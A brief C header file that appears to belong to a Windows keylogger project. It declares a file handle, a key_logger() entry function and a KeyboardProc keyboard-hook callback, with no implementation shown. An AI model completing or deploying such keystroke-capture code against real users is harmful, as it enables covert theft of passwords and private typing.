#pragma once
#include "utilities.h"


HANDLE file_handle;


// function starts the key logger.
int key_logger();

// function that implements the key logger.
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
